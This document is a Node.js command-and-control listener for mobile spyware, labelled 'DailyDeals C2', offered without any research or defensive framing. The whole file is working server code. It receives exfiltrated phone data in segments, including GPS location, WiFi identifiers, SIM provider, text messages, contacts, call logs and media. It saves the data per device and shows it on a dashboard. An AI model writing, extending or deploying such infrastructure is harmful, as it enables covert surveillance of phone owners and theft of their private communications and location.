// C2 Data Listener - receives & displays exfiltrated data in real-time
// Usage: node listener.js [port]
// Default port: 8080

const http = require('http');
const fs = require('fs');
const path = require('path');

const PORT = parseInt(process.argv[2]) || 8080;
const DATA_DIR = path.join(__dirname, 'data');

if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });

const server = http.createServer((req, res) => {
    // CORS headers
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, GET, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type, X-Request-ID');

    if (req.method === 'OPTIONS') {
        res.writeHead(200);
        return res.end();
    }

    if (req.method === 'POST') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', () => {
            try {
                const payload = JSON.parse(body);
                if (!payload.segment) {
                    res.writeHead(400);
                    return res.end(JSON.stringify({ status: 'error', message: 'Invalid payload' }));
                }

                const deviceId = payload.device_id || payload.install_token || 'unknown';
                const safeId = deviceId.replace(/[^a-zA-Z0-9_-]/g, '_');
                const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
                const deviceDir = path.join(DATA_DIR, safeId);
                if (!fs.existsSync(deviceDir)) fs.mkdirSync(deviceDir, { recursive: true });

                const dailyFile = path.join(deviceDir, `session_${timestamp}.json`);
                fs.writeFileSync(dailyFile, JSON.stringify(payload, null, 2));

                // Log to console with colors
                const colors = { 1: '\x1b[36m', 2: '\x1b[33m', 3: '\x1b[31m', reset: '\x1b[0m' };
                const c = colors[payload.segment] || '\x1b[35m';
                console.log(`${c}[SEGMENT ${payload.segment}]${colors.reset}`);
                console.log(`  Device   : ${payload.device_brand || '?'} ${payload.device_model || '?'} (${payload.os_version || '?'})`);
                console.log(`  ID       : ${deviceId}`);
                console.log(`  Location : ${payload.lat || '?'}, ${payload.lng || '?'}`);
                console.log(`  IP       : ${payload.local_ip || '?'}`);
                console.log(`  SIM      : ${payload.sim_provider || '?'}`);
                console.log(`  Seq      : ${payload.seq || 0}`);

                if (payload.segment === 1 && payload.network) {
                    console.log(`  WiFi SSID: ${payload.network.ssid || '?'}`);
                    console.log(`  WiFi BSSID: ${payload.network.bssid || '?'}`);
                }
                if (payload.segment === 2) {
                    const msgs = payload.messages ? (payload.messages.length || payload.messages) : 0;
                    const contacts = payload.contacts ? (payload.contacts.length || payload.contacts) : 0;
                    const calls = payload.call_log ? (payload.call_log.length || payload.call_log) : 0;
                    console.log(`  Messages : ${typeof msgs === 'number' ? msgs + ' entries' : 'present'}`);
                    console.log(`  Contacts : ${typeof contacts === 'number' ? contacts + ' entries' : 'present'}`);
                    console.log(`  Call Log : ${typeof calls === 'number' ? calls + ' entries' : 'present'}`);
                }
                if (payload.segment === 3 && payload.media) {
                    console.log(`  Media    : ${payload.media.length || payload.media} entries`);
                }
                console.log(`  Saved to : ${dailyFile}`);
                console.log('');

                // Write to live log
                const liveLog = path.join(deviceDir, 'live.log');
                const logLine = `[${new Date().toISOString()}] S${payload.segment} | ${payload.device_brand || '?'} ${payload.device_model || '?'} | ${payload.local_ip || '?'} | loc:${payload.lat || '?'},${payload.lng || '?'}\n`;
                fs.appendFileSync(liveLog, logLine);

                res.writeHead(200);
                res.end(JSON.stringify({ status: 'ok', segment: payload.segment, seq: payload.seq || 0 }));
            } catch (e) {
                console.error('\x1b[31m[ERROR] Failed to parse payload:\x1b[0m', e.message);
                res.writeHead(400);
                res.end(JSON.stringify({ status: 'error', message: e.message }));
            }
        });
        return;
    }

    // GET - Dashboard / status page
    if (req.method === 'GET') {
        if (req.url === '/') {
            const devices = fs.readdirSync(DATA_DIR).filter(f => fs.statSync(path.join(DATA_DIR, f)).isDirectory());
            let html = `<html><head><title>DailyDeals C2 Dashboard</title>
<style>body{font-family:monospace;background:#0d1117;color:#c9d1d9;padding:20px}
h1{color:#58a6ff}a{color:#58a6ff;text-decoration:none}
.device{border:1px solid #30363d;padding:12px;margin:8px 0;border-radius:6px}
.device:hover{background:#161b22}.meta{color:#8b949e;font-size:0.9em}
table{border-collapse:collapse;width:100%}td,th{border:1px solid #30363d;padding:6px 10px;text-align:left}
th{background:#21262d}.badge{background:#1f6feb;color:#fff;padding:2px 8px;border-radius:10px;font-size:0.8em}
</style></head><body>
<h1>&#9889; DailyDeals C2 Dashboard</h1>
<p>Listening on port ${PORT} | ${devices.length} device(s) reporting</p>`;

            if (devices.length === 0) {
                html += '<p style="color:#8b949e">No devices have reported yet. Waiting for data...</p>';
            } else {
                for (const device of devices) {
                    const deviceDir = path.join(DATA_DIR, device);
                    const files = fs.readdirSync(deviceDir).filter(f => f.startsWith('session_'));
                    const latestFile = files.sort().pop();
                    let summary = { device_id: device };
                    if (latestFile) {
                        try {
                            summary = JSON.parse(fs.readFileSync(path.join(deviceDir, latestFile), 'utf8'));
                        } catch(e) {}
                    }
                    const lastSeen = latestFile ? latestFile.replace('session_', '').replace('.json', '').replace(/[-]/g, ':') : 'never';
                    html += `<div class="device">
<h3>${summary.device_brand || '?'} ${summary.device_model || '?'} <span class="badge">${device.slice(0,16)}</span></h3>
<div class="meta">
IP: ${summary.local_ip || '?'} | OS: ${summary.os_version || '?'} | SIM: ${summary.sim_provider || '?'}<br>
Last segment: ${summary.last_segment || summary.segment || '?'} | Last seen: ${lastSeen.replace(/T/, ' ').replace(/\..+/, '')}
</div>
<a href="/device/${device}">View details &rarr;</a>
</div>`;
                }
            }
            html += '<p style="margin-top:30px;color:#484f58"><small>DailyDeals C2 v1.0</small></p></body></html>';
            res.writeHead(200, { 'Content-Type': 'text/html' });
            return res.end(html);
        }

        if (req.url.startsWith('/device/')) {
            const deviceId = req.url.replace('/device/', '');
            const deviceDir = path.join(DATA_DIR, deviceId);
            if (!fs.existsSync(deviceDir)) {
                res.writeHead(404);
                return res.end('Device not found');
            }
            const files = fs.readdirSync(deviceDir).filter(f => f.startsWith('session_')).sort().reverse();
            const allData = {};
            for (const f of files) {
                try {
                    const data = JSON.parse(fs.readFileSync(path.join(deviceDir, f), 'utf8'));
                    Object.assign(allData, data);
                } catch(e) {}
            }

            let html = `<html><head><title>Device - ${deviceId}</title>
<style>body{font-family:monospace;background:#0d1117;color:#c9d1d9;padding:20px}
h1{color:#58a6ff}pre{background:#161b22;padding:12px;border-radius:6px;overflow:auto}
table{border-collapse:collapse;width:100%}td,th{border:1px solid #30363d;padding:6px 10px;text-align:left}
th{background:#21262d}.back{color:#58a6ff}
</style></head><body>
<a href="/" class="back">&larr; Back</a>
<h1>Device: ${deviceId}</h1>
<table><tr><th>Field</th><th>Value</th></tr>`;
            for (const [k, v] of Object.entries(allData)) {
                if (k === 'segments') continue;
                const val = typeof v === 'object' ? `<pre>${JSON.stringify(v, null, 2)}</pre>` : String(v);
                html += `<tr><td>${k}</td><td>${val}</td></tr>`;
            }
            if (allData.segments) {
                html += `<tr><td colspan="2"><strong>Segments (${Object.keys(allData.segments).length} received)</strong></td></tr>`;
                for (const [seg, segData] of Object.entries(allData.segments)) {
                    html += `<tr><td>Segment ${seg}</td><td><pre>${JSON.stringify(segData.data, null, 2)}</pre></td></tr>`;
                }
            }
            html += `</table>
<p style="margin-top:30px;color:#484f58"><small>${files.length} session file(s)</small></p></body></html>`;
            res.writeHead(200, { 'Content-Type': 'text/html' });
            return res.end(html);
        }

        // Raw data endpoint
        if (req.url.startsWith('/raw/')) {
            const deviceId = req.url.replace('/raw/', '');
            const deviceDir = path.join(DATA_DIR, deviceId);
            if (!fs.existsSync(deviceDir)) {
                res.writeHead(404);
                return res.end('[]');
            }
            const files = fs.readdirSync(deviceDir).filter(f => f === 'live.log');
            if (files.length === 0) {
                res.writeHead(200, { 'Content-Type': 'application/json' });
                return res.end('[]');
            }
            const data = fs.readFileSync(path.join(deviceDir, 'live.log'), 'utf8');
            res.writeHead(200, { 'Content-Type': 'text/plain' });
            return res.end(data);
        }

        res.writeHead(200, { 'Content-Type': 'application/json' });
        return res.end(JSON.stringify({ status: 'running', port: PORT, uptime: process.uptime() }));
    }
});

server.listen(PORT, '0.0.0.0', () => {
    console.log(`\x1b[32m[+] DailyDeals C2 Listener running on http://0.0.0.0:${PORT}\x1b[0m`);
    console.log(`\x1b[33m[+] Data directory: ${DATA_DIR}\x1b[0m`);
    console.log(`\x1b[36m[+] Dashboard: http://localhost:${PORT}\x1b[0m`);
    console.log('');
    console.log('Waiting for device connections...');
    console.log('');
});
